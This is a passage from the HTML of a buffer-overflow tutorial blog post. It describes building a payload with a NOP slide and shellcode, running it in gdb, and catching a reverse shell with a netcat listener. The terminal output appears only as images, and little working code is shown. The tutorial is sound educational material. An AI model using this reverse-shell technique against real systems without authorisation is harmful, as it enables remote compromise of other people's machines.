<span class="n">write</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
    </div>
</div>
</p>
<p>We have inserted a NOP slide (<code>\x90</code>) in the payload before the shell code.</p>
<p>A NoOPeration instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won&rsquo;t let our (noted) memory address go useless.</p>
<p>Let&rsquo;s run the exploit to get our <code>payload</code>.</p>
<p>We run the program with a breakpoint set and feed to it the payload. Then, we  see what&rsquo;s there on the stack:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="run-exploit.png" alt="">
    </div>
</div>




<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="stack-after.png" alt="">
    </div>
</div>
</p>
<p>Let&rsquo;s setup a <code>netcat</code> listener in another terminal.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal &lt;2&gt;</div>
    </div>
    <div class="terminalbody">
        <img src="netcat1.png" alt="">
    </div>
</div>
</p>
<p>Now, let&rsquo;s <code>continue</code>:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="run-final.png" alt="">
    </div>
</div>
</p>
<p>Gdb is telling us that a new program is launched.</p>
<p>On switching to our second terminal, the one with listener.. we can see:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal &lt;2&gt;</div>
    </div>
    <div class="terminalbody">
        <img src="netcat2.png" alt="">
    </div>
</div>
</p>
<p>Vola! We got our reverse shell ðŸ”¥ ðŸ˜Ž</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://the-root-user.github.io/blog/tags/pwn/">pwn</a></li>
      <li><a href="https://the-root-user.github.io/blog/tags/buffer-overflow/">buffer overflow</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://the-root-user.github.io/blog/posts/ncc-ctf-2022/">
    <span class="title">Â« Prev</span>
    <br>
    <span>NCC CTF 2022 - Rev &amp; BinExp Challenges Writeup</span>
  </a>
  <a class="next" href="https://the-root-user.github.io/blog/posts/pwn-0x00-warmup/">
    <span class="title">Next Â»</span>
    <br>
    <span>Pwn 0x00: Warmup</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on twitter"
        href="https://twitter.com/intent/tweet/?text=Pwn%200x01%3a%20Buffer%20Overflow&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f&amp;hashtags=pwn%2cbufferoverflow">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f&amp;title=Pwn%200x01%3a%20Buffer%20Overflow&amp;summary=Pwn%200x01%3a%20Buffer%20Overflow&amp;source=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f&title=Pwn%200x01%3a%20Buffer%20Overflow">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on whatsapp"
        href="https://api.whatsapp.com/send?text=Pwn%200x01%3a%20Buffer%20Overflow%20-%20https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://the-root-user.github.io/blog">NewHorizonz</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 10,  
    background: '#1b1c1e',  
    scrollOffset: 20,  
    container: null,  
    template: null  
  });
});
</script>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
